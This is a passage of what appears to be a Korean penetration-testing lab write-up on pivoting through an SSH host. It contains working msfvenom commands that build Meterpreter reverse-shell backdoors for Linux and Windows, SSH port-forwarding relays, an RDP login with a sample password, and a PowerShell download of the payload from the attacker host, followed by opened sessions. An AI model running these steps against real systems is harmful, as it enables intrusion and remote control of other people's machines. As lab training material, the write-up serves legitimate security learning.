...
Aconnect to [10.8.0.37] from (UNKNOWN) [10.8.0.37] 59570
hi
...
```bash
┌──(kali㉿kali)-[~/Desktop/PNT]
└─$ msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=10.1.20.10 LPORT=4444 -f elf -o namgi_backdoor
```
...
피벗 호스트의 포트 4444로 들어오는 트래픽을 공격자 호스트로 전달되게 포트 포워딩 설정
```bash
┌──(kali㉿kali)-[~/Desktop/PNT]
└─$ ssh -R 10.1.20.10:4444:10.8.0.37:1234 ansible@10.1.10.10
```
...
[*] Sending stage (3090404 bytes) to 10.8.0.37
[*] Meterpreter session 1 opened (10.8.0.37:1234 -> 10.8.0.37:58502) at 2025-09-02 19:49:42 +0900                                                             
...
============
Name         : ens5
Hardware MAC : 06:f7:1c:ce:b7:db
MTU          : 9001
...
[ . . . ]
```
**패킷 이동 순서: 10.1.20.50 -> namgi_backdoor -> 10.1.20.10:4444 -> 10.8.0.37:1234 -> exploit/multi/handler**

#### 7. 리모트 포트 포워딩 확인

ssh 접속 디버그를 확인하려면 터미널에서 SSH 접속 시 `-v`, `-vv`, 또는 `-vvv` 옵션을 붙여 실행하면 로그를 자세히 볼 수 있다.
...
실제 현업에서는 scp를 이용하지 않고 C2 프레임워크를 이용하여 해당 과정을 수행하는데, C2 인프라 구축은 추후 게시할 예정이다.



### 예시 3: 윈도우 호스트 리버스 쉘 획득하기
```text
피벗 호스트: 10.1.10.10/10.1.20.10 (DMZ/IT)		|		SSH/22  

대상 호스트: 10.1.20.20		| 		RDP/3389
```

#### 1. 로컬 포트 포워딩으로 공격자 호스트의 localhost:8090 을 윈도우호스트(10.1.20.20:3389)로 포워딩
```bash
└─$ ssh -L 8090:10.1.20.20:3389 ansible@10.1.10.10
```


#### 2. localhost:1111 <- 10.1.20.20 RDP 접근
```bash
└─# xfreerdp /v:localhost:8090 /u:rdpuser1 /p:'Password123!'
```


#### 3. windows payload 생성
```bash
┌──(kali㉿kali)-[~/Desktop/PNT]
└─$ msfvenom -p windows/x64/meterpreter/reverse_https lhost=10.1.20.10 lport=4443 -f exe -o namgi_windows.exe
[ . . . ]
Payload size: 922 bytes
Final size of exe file: 7680 bytes
Saved as: namgi_windows.exe
```
...
#### 5. 리모트 포트 포워딩 설정
```sh
└─$ ssh -R 10.1.20.10:4443:0.0.0.0:8888 ansible@10.1.10.10
```
페이로드를 실행시켰을때 피벗호스트로 패킷을 보내기 때문에, 이후 피벗호스트(10.1.20.10:4443)의 패킷을 8888포트로 포워딩 시켜준다는 뜻

#### 6. 대상 호스트(윈도우)로 payload를 옮긴 후 실행 -> msfconsol 확인
```powershell
# 공격자 호스트 python 서버 열기
└─$ python3 -m http.server 80                
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
10.1.20.20 - - [02/Sep/2025 20:32:53] "GET /namgi_windows.exe HTTP/1.1" 200 -

# 윈도우 powershell 
Invoke-WebRequest -Uri "http://10.8.0.37:80/namgi_windows.exe" -OutFile "C:\Users\rdpuser1\Desktop\namgi_windows.exe"

# msfconsol 결과 확인
msf exploit(multi/handler) > run
[*] Started HTTPS reverse handler on https://0.0.0.0:8888
[*] https://0.0.0.0:8888 handling request from 127.0.0.1; (UUID: kbohvm4j)
[*] Meterpreter session 1 opened (127.0.0.1:8888 -> 127.0.0.1:42402) at 2025-09-02 20:50:18 +0900
